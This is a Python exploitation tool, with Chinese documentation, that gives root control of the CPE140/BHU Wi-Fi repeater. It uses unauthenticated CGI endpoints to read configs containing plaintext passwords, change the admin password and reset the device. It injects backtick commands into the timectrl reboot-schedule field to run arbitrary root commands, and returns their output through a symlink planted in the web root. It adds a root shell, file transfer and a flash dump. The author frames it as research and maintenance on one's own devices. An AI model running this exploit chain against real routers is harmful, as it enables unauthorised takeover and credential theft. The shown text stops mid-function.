#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cpe140.py —— 易阔 CPE140 / BHU BXO2000n-2S-Lite 中继器「完全控制台」(电脑版)

用法:
    python cpe140.py doctor                 # 自检 + 漏洞确认
    python cpe140.py status                 # 概览
    python cpe140.py shell                  # 交互式 root shell
    python cpe140.py sh "id; uname -a"      # 单条 root 命令
    python cpe140.py dump-flash out.bin     # 整片 flash 备份 (救砖)
    python cpe140.py gui                    # 图形界面

原理 —— 两条腿, 都不需要 Web 登录会话:

  A. Web API    /cgi-bin/* 全部未认证, POST + JSON, 自动补 interval 时间戳。
                可读全量配置(含明文口令)、改配置、改管理员密码、重启、恢复出厂。
  B. root RCE   /cgi-bin/timectrl (opcode=3, cronpara=2) 的 4 个值是未转义地拼进
                sh -c "uci -c /etc/config set administrator.reboot.week=<值>"
                用反引号命令替换即可 root 执行。单次载荷上限约 960 字节。

  输出回显      命令输出重定向到 /tmp/.cpeout (tmpfs, 快), 再让 /www/.cpeout 指向它,
                uhttpd 跟随符号链接 → HTTP GET 直接取回。零 flash 写入、无大小限制。
                巧思: 载荷本身不输出任何字符, 所以写进 uci 的值与原值完全相同,
                不会污染 /etc/crontabs/root 的定时重启规则。
  文件推送      裸 body POST /cgi-bin/upload → 落 /tmp/upload.img (tmpfs),
                再 mv 到目标, 实测 ~45 KB/s。

作者: kungful      许可: MIT
仅供自有设备的安全研究与日常运维使用。请勿用于未授权设备。
"""
from __future__ import annotations

import argparse
import atexit
import hashlib
import json
import os
import random
import re
import subprocess
import shlex
import socket
import string
import sys
import time
import urllib.error
import urllib.request

__version__ = "1.4.0"

HOWTO = r"""
==============================================================================
 使用教程（先看这里，3 分钟看懂）
==============================================================================

【1】现在是什么权限？—— 设备上的 root（最高权限）

  本工具不需要登录。它走设备固件里的两个漏洞：
    A. Web API   /cgi-bin/* 不校验 Cookie  -> 读全量配置、改配置、改口令、重启、恢复出厂
    B. root RCE  /cgi-bin/timectrl 的值被直接拼进 sh -c "..."  -> 以 uid=0 执行任意命令
  所以：你能做 SSH 登进去的 root 能做的任何事 —— 读写任意文件、装脚本、
  改 crontab、刷 flash、重启。

  一句话验证：  python cpe140.py sh "id; uname -a"
                -> uid=0(root) gid=0(root) …Linux BHU 4.14.149 mips

  这靠的是固件漏洞：万一厂家出了新固件把这个洞修了，本工具就失效了。
  另一种更稳的路是 SSH root（dropbear 22 端口，厂默认口令），
  本工具不硬编码口令，把口令写到 ~/.cpe140pw 就能用 doctor 看到。

【2】最常用的几条（照抄即可）

  python cpe140.py doctor                  自检：现在能不能控制、漏洞在不在
  python cpe140.py status                  概览：上行链路 / WAN / LAN
  python cpe140.py clients                 现在谁连着这台中继器
  python cpe140.py shell                   交互式 root shell（最像 Linux）
  python cpe140.py sh "cat /proc/net/arp"  单条命令
  python cpe140.py dump-flash bak.bin      整片 flash 备份（8MB，救砖的底牌）
  python cpe140.py gui                     图形界面（不想打命令就用这个）

【3】看门狗：断网 5/10 分钟就自动重启（你要的自动化）

  设备上跑的小脚本 /etc/netguard.sh，由 crontab 每 2 分钟叫一次：
    网络通       -> 计数清零，什么都不做
    网络不通     -> 计数 +1；连续 N 次（默认 5 次 = 10 分钟）才认定「真断网」
    真的断网     -> 写日志 + 重启设备；但如果 30 分钟内已经重启过，就跳过
    还一直不通   -> 单次断网最多自动重启 3 次（约 1 小时）；
                    到量后不再频繁重启，改为每 6 小时才试一次，
                    所以不会「每 30 分钟重启一次」地无限重启下去。
                    网络一恢复，计数归零，下次断网重新给满 3 次。
  它不是「定时重启」：不管几点，只看网络通不通；也不碰定时重启那条规则。

  python cpe140.py guard install            装上并开启（默认 10 分钟阈值）
  python cpe140.py guard install --minutes 5
  python cpe140.py guard install --max-reboot 5 --long-wait 7200
                                            改「单次断网最多重启几次 / 超限后间隔」
  python cpe140.py guard install --mode log 只监控不重启（先观察几天再用）
  python cpe140.py guard status             看状态（当前计数 / 上次自重启时间）
  python cpe140.py guard log                看日志
  python cpe140.py guard test               干跑：只告知「现在断网的话会怎样」
  python cpe140.py guard off / on           停用 / 启用
  python cpe140.py guard reset              计数清零
  python cpe140.py guard uninstall          彻底卸载（设备回到没装过的状态）

  建议：先 `guard install --mode log` 观察一两天，确认它只在真断网时计数，
  再 `guard install`（模式改回 reboot）正式启用。

  换新机器 / 恢复出厂后重新装 —— 一条命令搞定：
  python cpe140.py provision
      ① 验设备连通 ② 验 root 注入通道 ③ 验 uid=0
      ④ 备份整片 8MB flash（救砖，落到 cpe140_fullflash_<ip>.bin）
      ⑤ 装分级软修复 + 看门狗（4 个文件）⑥ 回读核对 ⑦ 挂 cron ⑧ 看当前连通性
      默认落到「只记录」模式，不会重启机器；观察几天再 guard install --mode reboot
  python cpe140.py --host 192.168.188.254 provision      对着别的设备（新机器）装
  python cpe140.py provision --no-backup --no-enable     只装文件，不备份也不挂 cron

【4】底层命令（前面带 guard 的都不用记，这里只是备查）

  sh "<命令>"          以 root 跑命令（长的/带引号的自动走上传脚本方式）
  cat  <设备路径>      读任意文件到屏幕，-o 存本地
  push <本地> <设备>   上传文件；  pull <设备> <本地> 下载
  cfg / set K=V        读 / 写全量配置（改变 SSID/密码/工作模式的键默认拦下）
  mode <模式>          切工作模式（gateway/repeater/wisp/ap/wds，危险）
  schedule --hour 4    定时重启（周几/几点几分）
  password <新口令>    改 Web 管理员口令（免密就能改）
  clean                清掉设备上工具留下的临时文件

【5】红线（工具已默认守住，请你也不要去碰）

  * 不要改 WLAN0_VAP0_* / WLAN0_VAP5_*（本机 AP 和上行无线）：改错了自己失联。
  * 不要碰 devmanage opcode 3/4/5（恢复出厂 / 刷固件 / 重启）—— 除非真需要。
  * 看门狗不要同时开两条（工具会去重，手改 crontab 请保持一条）。
  * 说“重启”就真的是重启：会断网 30～60 秒。先 `guard test` 确认判断正确。
==============================================================================
"""

DEFAULT_HOST = "192.168.188.254"


def factory_pw() -> str:
    """出厂/常用 root 口令：只从本机取，不写进源码（仓库是公开的）。

    取值顺序：环境变量 CPE140_PW -> ~/.cpe140pw -> 空。
    """
    pw = os.environ.get("CPE140_PW", "").strip()
    if pw:
        return pw
    for f in (os.path.expanduser("~/.cpe140pw"), ".cpe140pw"):
        try:
            with open(f, encoding="utf-8") as fh:
                return fh.read().strip().splitlines()[0]
        except (OSError, IndexError):
            continue
    return ""
INJ_MAX = 880                    # 注入载荷安全上限 (实测 ~960 字节)
OUT_TMP = "/tmp/.cpeout"         # 命令输出落点 (tmpfs)
OUT_LINK = "/www/.cpeout"        # 设备文件系统里的符号链接
OUT_URL = "/.cpeout"             # 对应的 HTTP 取回路径
UP_TMP = "/tmp/upload.img"       # /cgi-bin/upload 的固定落点
SH_TMP = "/tmp/.cpesh"           # 长命令临时脚本 (必须和 UP_TMP 分开!)

# 危险配置键: 改动可能让设备失联 / 变砖, 默认拒绝, 需 --force
DANGEROUS_KEYS = {
    "OP_MODE", "VLAN_ENABLED", "PSMODE", "LAN_IP_ADDR", "LAN_NETMASK",
    "LAN_DHCP_SERVER_ENABLED", "DHCP_SERVER_ENABLED", "WLAN0_VAP0_SSID",
    "WLAN0_VAP0_PSK", "WLAN0_VAP5_SSID", "WLAN0_VAP5_PSK",
    "WLAN0_VAP0_CHANNEL", "REG_DOMAIN", "HW_NAT_ENABLED",
}
MODE_MAP = {"gateway": 0, "repeater": 1, "wisp": 2, "ap": 3, "wds": 4}

# 断网看门狗（netguard）在设备上的落点
GUARD_SH = "/etc/netguard.sh"      # 巡检脚本本体
GUARD_CONF = "/etc/netguard.conf"  # 参数（分钟数/模式/恢复命令）


# 分级软修复（netfix）：比重启温和的救网阶梯
WAN_TARGETS = ("223.5.5.5", "114.114.114.114")   # 判定「有没有网」的探测目标
FIX_SH = "/etc/netfix.sh"       # 阶梯脚本本体
FIX_CONF = "/etc/netfix.conf"   # 参数
FIX_RECOVER = FIX_SH             # 看门狗默认的「先软后硬」恢复命令


def guard_script_path() -> str:
    """找 netguard.sh：cpe140.py 同级的 device/ 目录，或当前目录。"""
    return _device_script("netguard.sh")


def fix_script_path() -> str:
    """找 netfix.sh：cpe140.py 同级的 device/ 目录，或当前目录。"""
    return _device_script("netfix.sh")


def _device_script(name: str) -> str:
    """在几个候选位置里找 device/ 下的设备端脚本。"""
    here = os.path.dirname(os.path.abspath(__file__))
    for c in (os.path.join(here, "device", name),
              os.path.join(here, name),
              os.path.join(os.getcwd(), "device", name),
              os.path.join(os.getcwd(), name)):
        if os.path.isfile(c):
            return c
    raise CpeError(f"找不到 {name}（它应放在 cpe140.py 同级的 device/ 目录里）")


class CpeError(Exception):
    """设备返回错误 / 网络不通。"""


def _rand(n: int = 6) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _chan_msg(why: str) -> str:
    """回显通道丢了时的报错：说清楚是什么 + 接下来怎么办。"""
    return (f"回显通道丢了（{why}）：设备上取不到 {OUT_LINK}。\n"
            f"多半是设备刚重启过（/tmp 是内存盘，重启就清空；符号链接却留在 flash 上），\n"
            f"或另外一个工具清过临时文件。重跑这条命令就会自动重铺通道。")


def _hb(n: float) -> str:
    for u in ("B", "KB", "MB", "GB"):
        if n < 1024 or u == "GB":
            return f"{n:.0f}{u}" if u == "B" else f"{n:.1f}{u}"
        n /= 1024.0
    return f"{n}B"


# --------------------------------------------------------------------------- #
class Cpe:
    """CPE140 控制客户端 —— 纯标准库, HTTP 直连(绕过系统代理)。"""

    def __init__(self, host: str = DEFAULT_HOST, port: int = 80,
                 timeout: float = 20.0, verbose: bool = False):
        self.base = f"http://{host}:{port}"
        self.host = host
        self.timeout = timeout
        self.verbose = verbose
        self._sched: dict | None = None       # 定时重启原始配置(注入时用它做前缀)
        self._link_ok = False
        self._jar: dict = {}
        # 关键: 禁用系统代理 —— 局域网设备绝不该走 Clash/代理, 否则每个请求 +4.7s
        self._opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        atexit.register(self.close)

    # ------------------------------ HTTP ------------------------------ #
    def _log(self, *a):
        if self.verbose:
            print("[cpe]", *a, file=sys.stderr)

    def request(self, path: str, data: bytes | None = None,
                ctype: str = "application/json", timeout: float | None = None,
                method: str | None = None) -> bytes:
        req = urllib.request.Request(self.base + path, data=data, method=method)
        req.add_header("Content-Type", ctype)
        req.add_header("User-Agent", f"cpe140-ctrl/{__version__}")
        if self._jar:
            req.add_header("Cookie", "; ".join(f"{k}={v}" for k, v in self._jar.items()))
        t0 = time.time()
        try:
            with self._opener.open(req, timeout=timeout or self.timeout) as r:
                body = r.read()
                for h in r.headers.get_all("Set-Cookie") or []:
                    if "=" in h:
                        k, v = h.split(";")[0].split("=", 1)
                        self._jar[k.strip()] = v.strip()
        except urllib.error.HTTPError as e:
            body = e.read()
            if e.code == 404:
                raise CpeError(f"404 {path}") from None
            self._log(f"HTTP {e.code} {path}: {body[:120]!r}")
        except (urllib.error.URLError, socket.timeout, OSError) as e:
            raise CpeError(f"连不上 {self.base} ({e})") from None
        self._log(f"{path} <- {len(body)}B in {time.time()-t0:.2f}s")
        return body

    def api(self, cgi: str, payload: dict | None = None, timeout: float | None = None) -> dict:
        d = dict(payload or {})
        d.setdefault("interval", int(time.time()))
        raw = self.request(f"/cgi-bin/{cgi}", json.dumps(d).encode(), timeout=timeout)
        txt = raw.decode("utf-8", "replace").strip()
        if not txt:
            return {}
        try:
            v = json.loads(txt)
        except json.JSONDecodeError:
            raise CpeError(f"{cgi} 返回非 JSON: {txt[:200]}")
        if isinstance(v, dict) and str(v.get("result")) == "-1":
            raise CpeError(f"{cgi} 返回 result=-1 (参数被拒)")
        return v

    # --------------------------- 只读信息 --------------------------- #
    def sysinfo(self) -> dict:
        return self.api("sysinfo", {"opcode": "1"})

    def wireless_status(self) -> dict:
        return self.api("wireless_status", {"opcode": "1"})

    def wan(self) -> dict:
        return self.api("wan", {"opcode": "1"})

    def lan(self) -> dict:
        return self.api("lan", {"opcode": "1"})

    def wifi_config(self) -> dict:
        return self.api("wireless", {"opcode": "1"})

    def clients(self) -> dict:
        return self.api("lan_dhcpserver", {"opcode": "1"})

    def arp(self) -> list:
        """ARP 表 —— 本固件没有 sys_arplist, 直接走 root 读 /proc/net/arp。"""
        rows = []
        for ln in self.run("cat /proc/net/arp").splitlines()[1:]:
            p = ln.split()
            if len(p) >= 6:
                rows.append({"ip": p[0], "type": p[1], "flags": p[2],
                             "mac": p[3], "device": p[5]})
        return rows

    def active(self) -> dict:
        return self.api("active", {"opcode": "1"})

    def channels(self) -> dict:
        """可用信道 (旧笔记里的 channel_info 在本固件不存在, 用 wireless_channel)。"""
        return self.api("wireless_channel", {"opcode": "1"})

    def adv(self) -> dict:
        return self.api("wireless_adv", {"opcode": "1"})

    def scan(self, wlanid: int = 0, timeout: float = 60.0) -> dict:
        """周边 WiFi 扫描 (设备端较慢)。"""
        d = {"opcode": "1", "wlanid": str(wlanid), "interval": int(time.time())}
        raw = self.request("/cgi-bin/wireless_scan", json.dumps(d).encode(), timeout=timeout)
        try:
            return json.loads(raw.decode("utf-8", "replace") or "{}")
        except json.JSONDecodeError:
            return {}

    def cfg_all(self) -> dict:
        """全量配置 (含明文管理员口令 / WiFi PSK)。"""
        return self.api("easyconfig", {"opcode": "1"})

    def cfg_get(self, key: str | None = None):
        c = self.cfg_all()
        return c if key is None else c.get(key)

    # --------------------------- 配置写入 --------------------------- #
    def cfg_set(self, force: bool = False, **kw) -> dict:
        bad = [k for k in kw if k.upper() in DANGEROUS_KEYS]
        if bad and not force:
            raise CpeError(f"拒绝对危险键写入 {bad}; 确认无误请加 --force")
        p = {"opcode": "3"}
        p.update({k: str(v) for k, v in kw.items()})
        return self.api("easyconfig", p)

    def backup(self, path: str) -> str:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(self.cfg_all(), f, indent=2, ensure_ascii=False, sort_keys=True)
        return path

    def restore(self, path: str, force: bool = False) -> dict:
        with open(path, encoding="utf-8") as f:
            want = json.load(f)
        cur = self.cfg_all()
        diff = {k: v for k, v in want.items() if cur.get(k) != v}
        if not diff:
            return {"changed": 0}
        return dict(self.cfg_set(force=force, **diff), changed=len(diff))

    # ------------------------- root RCE 通道 ------------------------- #
    def sched(self) -> dict:
        """定时重启的原始 4 个值 (只读一次)。"""
        if self._sched is None:
            try:
                s = self.api("timectrl", {"opcode": "3", "cronpara": "1"})
                self._sched = {k: str(s.get(k, d)) for k, d in (
                    ("AUTO_REBOOT_ENABLED", "1"), ("AUTO_REBOOT_WEEK", "0"),
                    ("AUTO_REBOOT_HOUR", "4"), ("AUTO_REBOOT_MIN", "0"))}
            except CpeError:
                self._sched = {"AUTO_REBOOT_ENABLED": "1", "AUTO_REBOOT_WEEK": "0",
                               "AUTO_REBOOT_HOUR": "4", "AUTO_REBOOT_MIN": "0"}
        return self._sched

    def _inject(self, inner: str, timeout: float = 60.0) -> None:
        """把 inner 作为反引号命令替换塞进 timectrl 的值, 以 root 执行。

        inner 的 stdout 会重定向掉, 因此 uci 里存回的值与原值一致 —— 无副作用。
        """
        s = self.sched()
        # 末尾补一刀 chmod: cp 会把源文件权限(如 /etc/shadow 的 600)带过来,
        # 而 uhttpd 对 600 的文件回 403 —— 统一放开到 644 才能读回。
        payload = f"{s['AUTO_REBOOT_WEEK']}`{inner}; chmod 644 {OUT_TMP} 2>/dev/null`"
        if len(payload) > INJ_MAX:
            raise CpeError(f"注入载荷过长 {len(payload)} > {INJ_MAX}")
        d = {"opcode": "3", "cronpara": "2",
             "AUTO_REBOOT_ENABLED": s["AUTO_REBOOT_ENABLED"],
             "AUTO_REBOOT_HOUR": s["AUTO_REBOOT_HOUR"],
             "AUTO_REBOOT_MIN": s["AUTO_REBOOT_MIN"],
             "AUTO_REBOOT_WEEK": payload}
        self.api("timectrl", d, timeout=timeout)

    _UNSAFE = (chr(96), chr(34), chr(92), "$", "{", "}")
    # 反引号/双引号/反斜杠 会破坏 uci 值里的 sh -c "..." 语法；
    # $ 会被那层 shell 提前展开成空；{ } 会让 CGI 静默丢掉整个值。
    # 命中任何一个都改走「上传成脚本再执行」的路径。
    BUDGET = 620                     # 内联载荷长度上限 (给 uci 前缀+重定向留余量)

    def _ensure_link(self) -> None:
        """建立 /www/.cpeout -> /tmp/.cpeout 的读取通道 (整个会话只建一次)。

        先判存在再 : > —— 通道坏掉后重铺时不能把刚写好的输出截掉。
        """
        if self._link_ok:
            return
        self._inject(f"[ -e {OUT_TMP} ] || : > {OUT_TMP}; chmod 644 {OUT_TMP}; "
                     f"ln -sf {OUT_TMP} {OUT_LINK}")
        self._link_ok = True

    def _exec(self, cmdline: str, timeout: float = 60.0) -> None:
        """以 root 执行 cmdline, 输出全部扔进 OUT_TMP, 不取回。

        注入点位于 sh -c "uci ... =<值>" 的双引号内部, 因此载荷中出现
        反引号 / 双引号 / 反斜杠 会破坏语法 —— 这类命令改为先上传成脚本再执行。
        """
        if not any(ch in cmdline for ch in self._UNSAFE) and len(cmdline) <= self.BUDGET:
            self._inject(f"( {cmdline} ) > {OUT_TMP} 2>&1", timeout=timeout)
        else:
            self.request("/cgi-bin/upload", (cmdline + chr(10)).encode(),
                         ctype="application/octet-stream", timeout=60)
            self._inject(f"mv -f {UP_TMP} {SH_TMP}; sh {SH_TMP} > {OUT_TMP} 2>&1", timeout=timeout)

    def _read_out(self, timeout: float = 120.0) -> bytes:
        """取回 OUT_TMP 里的命令输出。

        404 / HTML 错误页说明回显通道丢了：设备重启后 /tmp 是内存盘会被清空，
        而 /www/.cpeout 这个符号链接留在 flash 上 -> GET /.cpeout 就是 404；
        别的工具 clean 过、或 /tmp/.cpeout 被删也一样。以前这里只管往下传，
        于是界面上把 uhttpd 的 404 网页当「命令输出」显示。现在自己重铺再试。
        """
        bad = ""
        for _ in range(3):
            try:
                body = self.request(OUT_URL, timeout=max(60.0, timeout))
            except CpeError as e:
                body, bad = None, str(e)
            else:
                bad = "设备回了 HTML 错误页" if body[:4] == b"<h1>" else ""
            if body is not None and not bad:
                return body
            self._link_ok = False
            self._ensure_link()
            time.sleep(0.3)
        raise CpeError(f"回显通道丢了（{bad}）：设备上取不到 {OUT_LINK}。\n"
                       f"多半是设备刚重启过（/tmp 是内存盘会清空，符号链接却留在 flash 上），\n"
                       f"或另外一个工具清过临时文件。已重铺并重试 3 次，重跑这条命令即可。")

    def _read_out(self, timeout: float = 120.0) -> bytes:
        """取回 OUT_TMP 里刚刚写好的命令输出（单次，不重试）。

        GET /.cpeout 拿到 404（或者 uhttpd 的 HTML 错误页）就说明回显通道丢了：
        设备重启后 /tmp 是内存盘会被清空，而 /www/.cpeout 这个符号链接留在 flash
        上；或者另一个工具 clean 过。这时候必须把 _link_ok 作废，让上层重铺通道。
        以前这里不管三七二十一把 body 当输出传下去，于是界面上会直接显示一段
        uhttpd 的 404 网页，像是“命令的输出”——看不懂也没法自愈。
        """
        try:
            body = self.request(OUT_URL, timeout=max(60.0, timeout))
        except CpeError as e:
            self._link_ok = False
            raise CpeError(_chan_msg(str(e))) from None
        if body[:4] == b"<h1>":
            self._link_ok = False
            raise CpeError(_chan_msg("设备回的是 uhttpd 的 404 错误页"))
        return body

    def _exec_read(self, cmd: str, timeout: float) -> bytes:
        """exec + 读回。通道刚坏时：先重铺再重读（不重跑命令），真不行才重跑。"""
        self._ensure_link()
        self._exec(cmd, timeout=timeout)
        try:
            return self._read_out(timeout=max(60.0, timeout))
        except CpeError:
            pass
        self._ensure_link()                              # 重铺（不会截掉刚才的输出）
        try:
            return self._read_out(timeout=max(60.0, timeout))
        except CpeError:
            self._exec(cmd, timeout=timeout)             # 最后手段：重跑一遍命令
            return self._read_out(timeout=max(60.0, timeout))

    def run(self, cmd: str, timeout: float = 120.0) -> str:
        """以 root 执行命令, 返回 stdout+stderr。"""
        return self._exec_read(cmd.strip(), timeout).decode("utf-8", "replace")

    def run_quiet(self, cmd: str, timeout: float = 60.0) -> None:
        """执行但不取回输出 (少一个来回)。"""
        self._ensure_link()
        self._exec(cmd.strip(), timeout)

    # --------------------------- 文件传输 --------------------------- #
    def push_bytes(self, data: bytes, remote: str, verify: bool = True,
                   tries: int = 3) -> int:
        """任意二进制上传: 裸 body → /tmp/upload.img → 目标路径。

        设备 CGI 偶发竞态（头一次回读可能拿到空内容），所以默认重试 3 次。
        """
        last = ""
        for i in range(max(1, tries)):
            if i:
                self._log(f"   重试上传 ({i + 1}/{tries}) …")
                self._link_ok = False          # 重新铺一遍回读通道
            self._ensure_link()
            self.request("/cgi-bin/upload", data, ctype="application/octet-stream",
                         timeout=max(60.0, len(data) / 15000.0 + 30))
            q = shlex.quote(remote)
            self._exec(f"mv -f {UP_TMP} {q} 2>/dev/null || cp {UP_TMP} {q}", timeout=90)
            if not verify:
                return len(data)
            got = self.run(f"wc -c < {q}", timeout=60).strip().split()
            try:
                n = int(got[0])
            except (ValueError, IndexError):
                last = "回读拿到空内容"
                continue
            if n == len(data):
                return len(data)
            last = f"设备端只有 {n} 字节"
        raise CpeError(f"上传校验失败: 期望 {len(data)} 字节，{last}（已重试 {tries} 次）")

    def push(self, local: str, remote: str) -> int:
        with open(local, "rb") as f:
            return self.push_bytes(f.read(), remote)

    def read_bytes(self, remote: str, timeout: float = 300.0) -> bytes:
        """读设备上任意文件 (先落到 tmpfs, 不吃 flash)。"""
        self._ensure_link()
        q = shlex.quote(remote)
        return self._exec_read(f"cp {q} {OUT_TMP} 2>/dev/null || cat {q} > {OUT_TMP}", timeout)

    def pull(self, remote: str, local: str) -> int:
        data = self.read_bytes(remote)
        with open(local, "wb") as f:
            f.write(data)
        return len(data)

    # ------------------------- 管理动作 ------------------------- #
    def reboot(self, wait: bool = False) -> bool:
        try:
            self.api("devmanage", {"opcode": "5"}, timeout=10)
        except CpeError:
            pass
        return self.wait_alive() if wait else True

    def wait_alive(self, timeout: float = 180) -> bool:
        t0 = time.time()
        while time.time() - t0 < timeout:
            time.sleep(3)
            try:
                if "PRODUCTNAME" in self.sysinfo():
                    return True
            except CpeError:
                continue
        return False

    def set_password(self, newpw: str, user: str = "admin", old: str = "root") -> dict:
        """未认证改 Web 管理员口令 (devmanage opcode=8)。"""
        return self.api("devmanage", {"opcode": "8", "currentuser": user,
                                      "name": user, "oldpassword": old, "password": newpw})

    def set_schedule(self, enabled: bool, week: int = 0, hour: int = 4, minute: int = 0) -> dict:
        r = self.api("timectrl", {"opcode": "3", "cronpara": "2",
                                  "AUTO_REBOOT_ENABLED": "1" if enabled else "0",
                                  "AUTO_REBOOT_WEEK": str(week),
                                  "AUTO_REBOOT_HOUR": str(hour),
                                  "AUTO_REBOOT_MIN": str(minute)})
        self._sched = None
        return r

    def set_mode(self, mode: str, force: bool = False) -> dict:
        """工作模式切换。本固件没有 fit_fat_switch, 只能改 easyconfig 的 OP_MODE。

        警告: 只改 OP_MODE 不会自动重建模式相关的网络配置, 可能让设备失联。
        0=网关 1=中继 2=WISP(本机当前) 3=AP 4=WDS
        """
        if mode not in MODE_MAP:
            raise CpeError(f"模式必须是 {list(MODE_MAP)} 之一")
        if not force:
            raise CpeError("模式切换高风险(可能失联), 请加 --force")
        try:
            return dict(self.api("fit_fat_switch", {"opcode": "2", "LAN_DHCP": "1",
                                                     "OP_MODE": str(MODE_MAP[mode]),
                                                     "needreboot": "1",
                                                     "DHCP_SERVER_ENABLED": "0",
                                                     "PSMODE": "1"}), via="fit_fat_switch")
        except CpeError:
            r = self.cfg_set(force=True, OP_MODE=MODE_MAP[mode])
            return dict(r, via="easyconfig", warning="需手动重启并重连, 模式相关配置可能需重建")

    def factory_reset(self) -> dict:
        return self.api("devmanage", {"opcode": "3"}, timeout=10)

    def upgrade(self, local: str, force: bool = False) -> dict:
        """固件升级 (devmanage opcode=4, multipart)。刷错即变砖。"""
        if not force:
            raise CpeError("刷固件有变砖风险, 请加 --force")
        with open(local, "rb") as f:
            fw = f.read()
        bnd = "----cpe" + _rand(12)
        body = (f"--{bnd}\r\nContent-Disposition: form-data; name=\"filename\"; "
                f"filename=\"{os.path.basename(local)}\"\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n").encode() \
            + fw + f"\r\n--{bnd}--\r\n".encode()
        raw = self.request("/cgi-bin/devmanage?opcode=4", body,
                           ctype=f"multipart/form-data; boundary={bnd}",
                           timeout=max(120.0, len(fw) / 8000.0))
        try:
            return json.loads(raw.decode("utf-8", "replace") or "{}")
        except json.JSONDecodeError:
            return {"raw": raw.decode("utf-8", "replace")[:200]}

    # --------------------------- 综合 --------------------------- #
    def dump_flash(self, path: str, mtd: int = 9, progress: bool = True) -> int:
        """整片 flash 备份 (默认 mtd9 fullflash = 8MB)。"""
        if progress:
            print(f"[*] 读取 /dev/mtd{mtd} → {path} (8MB, 约 10 秒)…", file=sys.stderr)
        data = self.read_bytes(f"/dev/mtd{mtd}", timeout=600)
        with open(path, "wb") as f:
            f.write(data)
        return len(data)

    def shell(self) -> None:
        info = self.sysinfo()
        print(f"CPE140 root shell @ {self.host}   "
              f"{info.get('PRODUCTNAME','?')} / {info.get('FIRMVERSION','?')}")
        print("内置: exit 退出 | cd 切目录 | !push 本地上传 | !pull 下载 | !local 本机命令\n")
        cwd = "/"
        while True:
            try:
                line = input(f"root@cpe140:{cwd}# ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if not line:
                continue
            if line in ("exit", "quit", "logout"):
                return
            if line.startswith("!local "):
                os.system(line[7:])
                continue
            for op, off, fn in (("!push ", 6, self.push), ("!pull ", 6, self.pull)):
                if line.startswith(op):
                    try:
                        a, b = shlex.split(line[off:])
                        print(f"-> {fn(a, b)} 字节")
                    except Exception as e:              # noqa: BLE001
                        print("失败:", e)
                    break
            else:
                if line.startswith("cd "):
                    try:
                        cwd = self.run(f"cd {cwd} 2>/dev/null; cd {line[3:]} "
                                       f"&& pwd").strip().splitlines()[-1] or cwd
                    except Exception as e:              # noqa: BLE001
                        print(e)
                    continue
                try:
                    out = self.run(f"cd {cwd} && {line}")
                except CpeError as e:
                    print("错误:", e)
                    continue
                sys.stdout.write(out if out.endswith("\n") or not out else out + "\n")

    def doctor(self) -> list[tuple[str, str, str]]:
        """自检: 连通性 + 这些漏洞是否仍然存在。"""
        res: list[tuple[str, str, str]] = []

        def add(item, ok, note):
            res.append((item, "OK" if ok else "FAIL", note))

        try:
            si = self.sysinfo()
            add("设备连通", ("PRODUCTNAME" in si or "FIRMVERSION" in si),
                f"{si.get('PRODUCTNAME','?')} / {si.get('FIRMVERSION','?')}")
        except CpeError as e:
            add("设备连通", False, str(e))
            return res

        try:
            c = self.cfg_all()
            add("未认证读全量配置", len(c) > 20,
                f"{len(c)} 项, 明文管理员口令={c.get('USER_PASSWORD')!r}")
        except CpeError as e:
            add("未认证读全量配置", False, str(e))

        try:
            t0 = time.time(); self.run("true"); base = time.time() - t0
            t0 = time.time(); self.run("sleep 3"); slow = time.time() - t0
            add("root RCE 命令注入", slow - base > 2.0, f"true={base:.2f}s / sleep3={slow:.2f}s")
        except CpeError as e:
            add("root RCE 命令注入", False, str(e))

        try:
            i = self.run("id").strip()
            add("以 root 执行", "uid=0" in i, i)
        except CpeError as e:
            add("以 root 执行", False, str(e))

        try:
            pw = factory_pw()
            add("出厂 root 口令", bool(pw),
                (f"SSH: root / {pw} (dropbear 22 端口)" if pw else
                 "未配置。本机把口令写进 ~/.cpe140pw 或 export CPE140_PW=... "
                 "（公开仓库里不硬编码，避免替人开后门）"))
        except Exception:                                # noqa: BLE001
            pass
        return res

    # ------------------------- 断网诊断 & 分级软修复 ------------------------- #

    def netfix_install(self) -> str:
        """把分级软修复脚本装到设备（幂等，不启用任何自动动作）。"""
        with open(fix_script_path(), "rb") as f:
            self.push_bytes(f.read(), FIX_SH)
        self.run(f"chmod 755 {FIX_SH}")
        conf = ("# 由 cpe140 控制台写入：分级软修复参数\n"
                "TARGETS=\"%s\"\n" % " ".join(WAN_TARGETS) +
                "STEPS=\"usr1 unstuck renew reassoc ifup wifireload\"\n")
        self.push_bytes(conf.encode(), FIX_CONF)
        self.run(f"chmod 644 {FIX_CONF}")
        return self.netfix_status()

    def netfix_status(self) -> str:
        return self.run(f"sh {FIX_SH} status 2>&1")

    def netfix_log(self, n: int = 40) -> str:
        return self.run(f"sh {FIX_SH} log 2>&1 | tail -n {n}")

    def netfix_check(self) -> str:
        return self.run(f"sh {FIX_SH} check 2>&1")

    def netfix_dry(self) -> str:
        """干跑：只打印会做什么，绝不执行。"""
        return self.netfix_run(dry=True)

    def netfix_run(self, wait: float = 90.0, dry: bool = False) -> str:
        """现在就按阶梯软修一次（从最轻的动作开始，救回来就停）。

        脚本放后台跑、这里轮询它的输出 —— 因为最坏情况要跑 1 分多钟，
        而 uhttpd 的 CGI 只等 60 秒，同步调用会被半路砍断。
        """
        cmd = ("DRY=1 " if dry else "") + f"sh {FIX_SH}"
        self.run_quiet(f"{cmd} > /tmp/netfix.out 2>&1 &", timeout=30)
        t0 = time.time()
        out = ""
        while time.time() - t0 < wait:
            time.sleep(3)
            try:
                out = self.run("cat /tmp/netfix.out 2>/dev/null", timeout=60)
            except CpeError:
                continue
            if "--netfix--end" in out:
                break
        return out.strip() or "(没有输出 —— 脚本可能没跑起来)"

    def diagnose(self) -> str:
        """断网取证：一键盘点每一层，并给出「到底是哪一层坏了」的判定。

        专治那个怪现象：打开管理页就又能上网 —— 多半是固件自带的
        「强制门户」误判，把 DNS/HTTP 劫持到自己页面上（假断网）。
        """
        def sh(cmd: str, to: float = 60.0) -> str:
            try:
                return self.run(cmd, timeout=to).strip()
            except Exception as e:                       # noqa: BLE001
                return f"<执行失败: {e}>"

        L: list[str] = ["========== 断网取证快照 ==========",
                        sh("date '+%Y-%m-%d %H:%M:%S'; uptime")]

        # 时间戳 + 上行无线
